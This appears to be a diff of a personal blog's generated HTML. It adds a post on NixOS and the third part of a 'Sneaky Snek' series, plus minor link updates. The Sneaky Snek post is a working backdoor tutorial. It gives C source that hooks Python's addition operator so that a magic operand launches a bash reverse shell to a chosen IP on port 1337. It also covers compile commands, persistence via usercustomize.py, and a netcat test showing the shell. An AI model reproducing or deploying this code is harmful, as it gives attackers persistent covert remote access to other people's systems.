+</article>
+
+
+
+  
+    <article id="post-Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-III" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/05/28/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-III/" class="article-date">
+  <time class="dt-published" datetime="2023-05-28T01:02:15.000Z" itemprop="datePublished">2023-05-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/05/28/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-III/">Sneaky Snek: Messing with Python&#39;s Internal Functions (Part III)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>We’re back with another part of the series!</p>
+<p>In the <a href="2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-II/">Previous Part</a>, we’ve hooked <code>PyNumber_Add</code> function using <code>ctypes</code> and replaced it with our own implementation.<br>In this part, we will extend our extension to a backdoor that will return a reverse shell given specific addition operands.</p>
+<p>To the drawing board!</p>
+<h3 id="The-Plan"><a href="#The-Plan" class="headerlink" title="The Plan"></a>The Plan</h3><ul>
+<li>Just like in the previous part, we will hook the <code>PyNumber_Add</code> function</li>
+<li>Our code will check if one of the operands is <code>0xdeadbeef</code>.</li>
+<li>If so, it will extract the other operand and use it as an IPv4 address</li>
+<li>It will then connect to the address on port 1337 and spawn a reverse shell</li>
+</ul>
+<h3 id="Adding-our-trigger"><a href="#Adding-our-trigger" class="headerlink" title="Adding our trigger"></a>Adding our trigger</h3><p>In our previous implementation, after checking that both operands are integers, we added a check to see if they are both equal to <code>2</code>.<br>We will replace this check with a check to see if one of the operands is <code>0xdeadbeef</code>, and if so, we will extract the other operand and use it as an IPv4 address.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ipNum = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> ip[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (PyLong_Check(a) &amp;&amp; PyLong_Check(b)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (PyLong_AsLong(a) == <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">        ipNum = PyLong_AsLong(b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (PyLong_AsLong(b) == <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">        ipNum = PyLong_AsLong(a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Addition implementation</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="IP-Extraction-and-Reverse-shell"><a href="#IP-Extraction-and-Reverse-shell" class="headerlink" title="IP Extraction and Reverse shell"></a>IP Extraction and Reverse shell</h3><p>Since we have access to the Python C API, we have the freedom to run any Python code we want!</p>
+<p>We will use the <code>os</code>, <code>socket</code> and <code>subprocess</code> modules to spawn a reverse shell. To avoid string formatting in C, we will use <code>strcat</code> to concatenate the strings. The IP address is extracted one byte at a time, using bit shifting and masking with <code>0xff</code> to get the lowest byte each time.</p>
+<p>The reverse shell itself is a Python one-liner that uses <code>os.dup2</code> to duplicate the socket file descriptor to the standard input, output and error, and then uses <code>subprocess.call</code> to spawn a shell.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> revShell[<span class="number">4096</span>] = <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ipNum != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// Convert the IP address to a string</span></span><br><span class="line">    <span class="built_in">snprintf</span>(ip, <span class="keyword">sizeof</span>(ip), <span class="string">&quot;%d.%d.%d.%d&quot;</span>, ipNum &amp; <span class="number">0xff</span>, (ipNum &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>, (ipNum &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>, (ipNum &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Connect to the IP address on port 1337 and spawn a shell</span></span><br><span class="line">    <span class="built_in">strcat</span>(revShell, ip);</span><br><span class="line">    <span class="built_in">strcat</span>(revShell, <span class="string">&quot;\&quot;,1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/bash\&quot;,\&quot;-i\&quot;]);&quot;</span>);</span><br><span class="line">    PyRun_SimpleString(revShell);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>And violà! We now have a backdoor that will spawn a reverse shell when the operands are <code>0xdeadbeef</code> and an IPv4 address.</p>
+<h3 id="Putting-it-all-together"><a href="#Putting-it-all-together" class="headerlink" title="Putting it all together"></a>Putting it all together</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Python.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">PyObject* <span class="title function_">my_add</span><span class="params">(PyObject* a, PyObject* b)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ipNum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> ip[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> revShell[<span class="number">4096</span>] = <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Increment the reference count of a and b</span></span><br><span class="line">    Py_INCREF(a);</span><br><span class="line">    Py_INCREF(b);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that a and b are both PyLongs</span></span><br><span class="line">    <span class="keyword">if</span> (!PyLong_Check(a) || !PyLong_Check(b)) &#123;</span><br><span class="line">        Py_DECREF(a);</span><br><span class="line">        Py_DECREF(b);</span><br><span class="line">        <span class="keyword">return</span> Py_None;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// PyNumber_Subtract(a, b) is equivalent to a - b,</span></span><br><span class="line">    <span class="comment">// So we can calculate a + b by doing a - (-b).</span></span><br><span class="line">    <span class="comment">// We can get -b by multiplying b by -1.</span></span><br><span class="line">    PyObject *minus_b = PyNumber_Multiply(b, PyLong_FromLong(<span class="number">-1</span>));</span><br><span class="line">    PyObject *result = PyNumber_Subtract(a, (PyObject*) minus_b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (PyLong_AsLong(a) == <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">        ipNum = PyLong_AsLong(b);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (PyLong_AsLong(b) == <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">        ipNum = PyLong_AsLong(a);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (ipNum != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(ip, <span class="keyword">sizeof</span>(ip), <span class="string">&quot;%lu.%lu.%lu.%lu&quot;</span>, (ipNum &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>, (ipNum &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, (ipNum &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, ipNum &amp; <span class="number">0xFF</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(revShell, ip);</span><br><span class="line">        <span class="built_in">strcat</span>(revShell, <span class="string">&quot;&#x27;,1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span>);</span><br><span class="line"></span><br><span class="line">        PyRun_SimpleString(revShell);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Py_DECREF(a);</span><br><span class="line">    Py_DECREF(b);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h3><p>Python looks for a startup script in the <code>site-packages/usercustomize.py</code> file, so we can drop our script from the <a href="2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-II/">previous part</a> there and it will be loaded automatically. Don’t forget to edit the Python script and change the path to <code>my_add.so</code> to the correct path on your machine.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Compile our backdoor module</span></span><br><span class="line">gcc -shared -o my_add.so -fPIC my_add.c $(python3-config --includes --ldflags)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find the user site-packages directory</span></span><br><span class="line">python -c <span class="string">&quot;import site; print(site.USER_SITE)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Edit the script and change the path to `my_add.so` to the full path of `site-packages/my_add.so` on your machine</span></span><br><span class="line">vim snek.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># Copy the our script to `site-packages/sitecustomize.py`</span></span><br><span class="line"><span class="built_in">cp</span> snek.py /home/user/.local/lib/python3.8/site-packages/usercustomize.py</span><br></pre></td></tr></table></figure>
+
+<p>Now, let’s test our backdoor!</p>
+<h3 id="Testing"><a href="#Testing" class="headerlink" title="Testing"></a>Testing</h3><p>We’ll listen on port 1337 using <code>nc</code>.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nc -vvlp 1337</span><br><span class="line">Listening on astral 1337</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s perform a simple calculation and see what happens.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ python3</span><br><span class="line">Address of my_add: 0x7face7051276</span><br><span class="line">Address of PyNumber_Add: 0x50f750</span><br><span class="line">mprotect(addr=0x50f000, size=0x1000, perms=0x7) ret=0 errno=0</span><br><span class="line">Address of shellcode trampoline: 0x7face6f90390</span><br><span class="line">memmove: 0x50f750</span><br><span class="line">1 + 1 = 2</span><br><span class="line">2 + 2 = 4</span><br><span class="line">Python 3.8.10 (default, May 26 2023, 14:05:08)</span><br><span class="line">[GCC 9.4.0] on linux</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; 1 + 1</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
+
+<p>So far so good, but does our backdoor work? <code>0x7f000001</code> is hex for <code>127.0.0.1</code>, so let’s try that!</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 0xdeadbeef + 0x7f000001</span><br></pre></td></tr></table></figure>
+
+<p>And we get a shell! Beautiful!</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Connection received on localhost 34998</span><br><span class="line">user@astral:~$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(user) gid=1000(user) <span class="built_in">groups</span>=1000(user),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)</span><br><span class="line">user@astral:~$ </span><br></pre></td></tr></table></figure>
+
+<h3 id="Notes-and-Caveats"><a href="#Notes-and-Caveats" class="headerlink" title="Notes and Caveats"></a>Notes and Caveats</h3><p>This is a proof of concept, and is not meant to be used in production (whatever “production” means for a backdoor, lol).</p>
+<p>Here are some of the things that could go wrong with this implementation:</p>
+<ul>
+<li>I’m pretty sure the current implementation breaks a lot of things, such as the <code>+</code> operator for other types, but I haven’t tested it extensively</li>
+<li>Thread safety is not guaranteed</li>
+<li>The <code>mprotect</code> call won’t work on platforms with <code>W^X</code> memory protection</li>
+<li><code>mprotect</code> won’t work on Windows</li>
+<li>The shellcode trampoline won’t work on platforms other than x86_64</li>
+<li>The inline hook is implemented in a very naive way, and overwrites the original function code of <code>PyNumber_Add</code>. A better way to implement the inline hook would be to use a trampoline, and jump to the original function code after we’re done. This requires us to allocate a page of executable memory, and copy the original function code there, and then jump to it</li>
+<li>Alternatively, we can use a hooking library such as <a target="_blank" rel="noopener" href="https://github.com/Zeex/subhook">subhook</a></li>
+<li>The reverse shell doesn’t fork a child process, so the Python process will get stuck until the reverse shell exits, and <code>stdin</code> &#x2F; <code>stdout</code> &#x2F; <code>stderr</code> won’t get redirected back to the user</li>
+</ul>
+<p>Improvements and features that can be added:</p>
+<ul>
+<li>We can use <code>mmap()</code> to get a page of executable memory and load shellcode from memory, instead of using <code>CDLL</code> to load a shared library from disk</li>
+<li>The backdoor components and it’s communication are not encrypted or obfuscated in any way</li>
+<li>A Python shell would be nice, instead of relying on <code>/bin/bash</code></li>
+<li>As an attacker, there are better hook targets than <code>PyNumber_Add</code>, such as <code>socket.recv()</code>, which is guaranteed to be called with user input in a lot of places</li>
+<li>Another option is string formatting functions, which are also used everywhere and likely to be called with user input (thanks to <a target="_blank" rel="noopener" href="https://twitter.com/HarpazDor">@HarpazDor</a> for the suggestion!)</li>
+</ul>
+<p>This was a really fun way to spend a weekend!<br>I hope you enjoyed reading this series as much as I enjoyed writing it, and maybe even learned something new along the way.</p>
+<p>Ciao for now!</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://astral.page/2023/05/28/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-III/" data-id="cljnjoucs000kbvor6b7rfx2l" data-title="Sneaky Snek: Messing with Python&#39;s Internal Functions (Part III)" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-NixOS-is-so-Cool" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/05/26/NixOS-is-so-Cool/" class="article-date">
+  <time class="dt-published" datetime="2023-05-26T01:02:15.000Z" itemprop="datePublished">2023-05-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/05/26/NixOS-is-so-Cool/">NixOS is so Cool!</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>Last night I played with NixOS (huge thanks to my friend <a target="_blank" rel="noopener" href="https://tzlil.net/">Tzlil</a> for the recommendation!) and I had so much fun! It’s a Linux distro, somewhat similar to Arch Linux in terms of minimalist philosophy but with emphasis on reproducibility.</p>
+<p>Keep in mind I’m still a newbie so there is a lot I might be missing in this post! Be sure to check out the (unofficial, community-maintained) <a target="_blank" rel="noopener" href="https://nixos.wiki/">NixOS Wiki</a>.</p>
+<h3 id="Reproducibility"><a href="#Reproducibility" class="headerlink" title="Reproducibility"></a>Reproducibility</h3><p>This basically means that anything you install is automatically added to your nix file(s). You can easily control your entire system configuration - bootloader, partition layout, wpa_supplicant, packages, user profiles, services, environment, software-specific configuration, <strong>Everything</strong> can be declared in the Nix config files. They freakin’ support stuff like chromium &#x2F; firefox profiles and <a target="_blank" rel="noopener" href="https://search.nixos.org/options?channel=unstable&show=programs.chromium.extensions&from=0&size=50&sort=relevance&type=packages&query=programs.chromium">extensions</a>, oh-my-zsh theme, <code>.vimrc</code> options, you name it.</p>
+<p>These config files can be backed up in a git repository that you can easily deploy whenever you need to restore, clone or modify your system.</p>
+<h3 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h3><p>Installation is super straightforward for what you’d usually expect from this type of minimalistic OS. There is a friendly GUI that lets you pick which type of Desktop Environment you want (if any) and the usual stuff (region, user &#x2F; pass).</p>
+<p><img src="/images/nixos-installer.png"></p>
+<p>I chose GNOME as my Desktop Environment. After the setup finished, I was greeted by this beautiful screen:</p>
+<p><img src="/images/nixos-installed.png"></p>
+<p>The disk usage for the default GNOME installation is just shy of 9 GB.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[user@nixos:~]$ df -h | grep sda</span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">devtmpfs        196M     0  196M   0% /dev</span><br><span class="line">tmpfs           2.0G  8.0K  2.0G   1% /dev/shm</span><br><span class="line">tmpfs           976M   11M  965M   2% /run</span><br><span class="line">tmpfs           2.0G  456K  2.0G   1% /run/wrappers</span><br><span class="line">/dev/sda1        20G  8.7G  9.9G  47% /</span><br><span class="line">tmpfs           391M  116K  390M   1% /run/user/1000</span><br><span class="line">/dev/sr0        2.3G  2.3G     0 100% /run/media/user/nixos-gnome-22.11-x86_64</span><br></pre></td></tr></table></figure>
+
+<h3 id="Enabling-experimental-Nix-features"><a href="#Enabling-experimental-Nix-features" class="headerlink" title="Enabling experimental Nix features"></a>Enabling experimental Nix features</h3><p><strong>Nix</strong> is NixOS’s package manager, it uses it’s own expression-based pure-functional language, “Nix”, to define the logic that decides which packages are installed. The first thing we wanna do is go ahead and enable “experimental” Nix features. This gives us access to stuff like <a target="_blank" rel="noopener" href="https://nixos.wiki/wiki/Flakes">Flakes</a> which are the new way of creating and managing packages.</p>
+<h3 id="Trying-out-packages-temporarily"><a href="#Trying-out-packages-temporarily" class="headerlink" title="Trying out packages temporarily"></a>Trying out packages temporarily</h3><p>If we just wanna play with a package, we can have it downloaded and run temporarily.<br>When the command completes, the package will disappear from our system!</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[user@nixos:~]$ echo 123 | nix run nixpkgs#ripgrep 123</span><br><span class="line">123</span><br><span class="line"></span><br><span class="line">[user@nixos:~]$ rg</span><br><span class="line">rg: command not found</span><br></pre></td></tr></table></figure>
+
+<h3 id="nix-shell"><a href="#nix-shell" class="headerlink" title="nix-shell"></a>nix-shell</h3><p>Using the <a target="_blank" rel="noopener" href="https://nixos.org/manual/nix/stable/command-ref/nix-shell.html">nix-shell</a> command, we can create a temporary, isolated shell environment where we can temporarily play with a package.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[user@nixos:~]$ nix-shell -p wget</span><br><span class="line">this path will be fetched (0.62 MiB download, 3.25 MiB unpacked):</span><br><span class="line">  /nix/store/biaz74lcslins8c0kl5pv3yzxp1b02qj-wget-1.21.3</span><br><span class="line">copying path &#x27;/nix/store/biaz74lcslins8c0kl5pv3yzxp1b02qj-wget-1.21.3&#x27; from &#x27;https://cache.nixos.org&#x27;...</span><br><span class="line"></span><br><span class="line">[nix-shell:~]$ wget</span><br><span class="line">wget: missing URL</span><br><span class="line">Usage: wget [OPTION]... [URL]...</span><br><span class="line"></span><br><span class="line">Try `wget --help&#x27; for more options.</span><br><span class="line"></span><br><span class="line">[nix-shell:~]$ exit</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">[user@nixos:~]$ wget</span><br><span class="line">wget: command not found</span><br></pre></td></tr></table></figure>
+
+<p>You can also use <code>nix-shell</code> with some Nix scripting to make <a target="_blank" rel="noopener" href="https://nixos.wiki/wiki/Development_environment_with_nix-shell">your own isolated development environment</a>. How cool is that!</p>
+<h3 id="Installing-packages-persistently"><a href="#Installing-packages-persistently" class="headerlink" title="Installing packages persistently"></a>Installing packages persistently</h3><p>I’m feeling like typing stuff, so let’s install Vim!<br>To add a package persistently, we can edit our <code>/etc/nixos/configuration.nix</code> and add it here:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">environment.systemPackages = with pkgs; [</span><br><span class="line">  # Existing packages...</span><br><span class="line">  vim</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
+
+<p>Then, we need to run <code>sudo nixos-rebuild switch</code> and it applies our new configuration, installing the package.</p>
+<p>Alternatively, we can simply run <code>sudo nix-env -iA nixos.vim</code>.<br>It actually does the same thing behind the scenes - it changes the <code>configuration.nix</code> file.</p>
+<h3 id="Why-this-excites-me"><a href="#Why-this-excites-me" class="headerlink" title="Why this excites me"></a>Why this excites me</h3><p>I have a problem with system bloat.<br>It’s not so much that I mind some of my disk being consumed by gigabytes of pointless cyber-garbage.</p>
+<p>It’s more about the fact that you’re constantly afraid to change things, because systems become slow and break over time. Sure, there are backups, but is everything really guaranteed to be there and work correctly when something breaks? This has a terrible consequence - You don’t experiment on your host environment, and you don’t improve. You don’t even know what your system is running under the hood because you’re too afraid to look down there! So, how does it do you any good to have your OS entirely open-source if you never change anything because you’re afraid to break stuff? </p>
+<p>Having the entire setup configuration declared in a bunch of files in a git repo just frees me to try crazy stuff, experiment! Try a new WM, mess with the configs, change the kernel! This is the true spirit of open source. If anything ever breaks, slows down or even gets compromised, I just copy over a bunch of files and do a <code>sudo nixos-rebuild switch</code>, and if I really mess up, I could always reinstall NixOS and apply the configuration, or even <a target="_blank" rel="noopener" href="https://nixos.wiki/wiki/Creating_a_NixOS_live_CD">create an installation ISO based on my config files</a> to get everything back and working.</p>
+<p>If you like a certain setup, you could easily clone it to another PC, or even share it with friends. You could have an entire organizational network definition, including desktops, servers, routers all declared in a central repository, and <a target="_blank" rel="noopener" href="https://nixops.readthedocs.io/en/latest/overview.html">deploy</a> them with a single command, or even have them <a target="_blank" rel="noopener" href="https://nixos.wiki/wiki/Netboot">PXE boot from network</a> and install a fresh config. This level of control and transparency makes maintenance, upgrades, security and life in general so much simpler and more fun.</p>
+<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://nixos.org/">https://nixos.org/</a></li>
+<li><a target="_blank" rel="noopener" href="https://nixos.wiki/">https://nixos.wiki/</a></li>
+<li><a target="_blank" rel="noopener" href="https://fasterthanli.me/series/building-a-rust-service-with-nix/part-9">https://fasterthanli.me/series/building-a-rust-service-with-nix/part-9</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://astral.page/2023/05/26/NixOS-is-so-Cool/" data-id="cljnjoucl0009bvor36wo81zw" data-title="NixOS is so Cool!" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tech/" rel="tag">tech</a></li></ul>
 
     </footer>
   </div>
@@ -662,7 +662,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://astral.page/2023/05/20/Poem-Kiss-the-Stars-Goodbye/" data-id="cljnjisz0000bdjorer4lddz4" data-title="Poem: Kiss the Stars Goodbye" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://astral.page/2023/05/20/Poem-Kiss-the-Stars-Goodbye/" data-id="cljnjoucm000bbvor8rbicjm9" data-title="Poem: Kiss the Stars Goodbye" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -708,7 +708,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://astral.page/2023/05/18/The-Importance-of-Preserving-Progress/" data-id="cljnjiszb000pdjorhmsj4n0c" data-title="The Importance of Preserving Progress" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://astral.page/2023/05/18/The-Importance-of-Preserving-Progress/" data-id="cljnjoucu000pbvor3akl26g4" data-title="The Importance of Preserving Progress" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -753,7 +753,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://astral.page/2023/05/15/Nature-and-Attention-Restoration/" data-id="cljnjisyv0006djore1gv2sob" data-title="Nature&#39;s Restorative Powers" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://astral.page/2023/05/15/Nature-and-Attention-Restoration/" data-id="cljnjoucj0006bvore34e27li" data-title="Nature&#39;s Restorative Powers" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -802,7 +802,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://astral.page/2023/05/14/True-Freedom-Requires-Accepting-Death/" data-id="cljnjisze000udjor3vzybi2h" data-title="True Freedom Requires Accepting Death" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://astral.page/2023/05/14/True-Freedom-Requires-Accepting-Death/" data-id="cljnjoucv000ubvor2u379knt" data-title="True Freedom Requires Accepting Death" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -866,15 +866,7 @@
       <ul>
         
           <li>
-            <a href="/2023/07/04/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-III/">Sneaky Snek: Messing with Python&#39;s Internal Functions (Part III)</a>
-          </li>
-        
-          <li>
             <a href="/2023/07/04/An-Exercise-in-Self-Love-What-Would-You-Wish-for-Yourself/">An Exercise in Self Love: What Would You Wish for Yourself?</a>
-          </li>
-        
-          <li>
-            <a href="/2023/07/04/NixOS-is-so-Cool/">NixOS is so Cool!</a>
           </li>
         
           <li>
@@ -883,6 +875,14 @@
         
           <li>
             <a href="/2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-I/">Sneaky Snek: Messing with Python&#39;s Internal Functions (Part I)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/10/Guilt-Free-Reflection/">Guilt-Free Reflection</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/28/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-III/">Sneaky Snek: Messing with Python&#39;s Internal Functions (Part III)</a>
           </li>
         
       </ul>
